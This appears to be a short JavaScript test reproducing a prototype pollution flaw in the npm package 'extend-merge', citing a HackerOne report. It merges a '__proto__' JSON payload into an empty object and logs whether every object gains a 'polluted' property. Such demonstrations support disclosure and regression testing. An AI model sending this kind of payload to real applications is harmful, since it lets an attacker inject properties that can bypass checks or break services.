// //https://hackerone.com/reports/878339
// test("prototype pollution in extend-merge", () => {
  const extend_merge = require("extend-merge");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  let obj = {};

console.log({}.polluted);

  extend_merge.merge({}, payload);
console.log({}.polluted);
// });
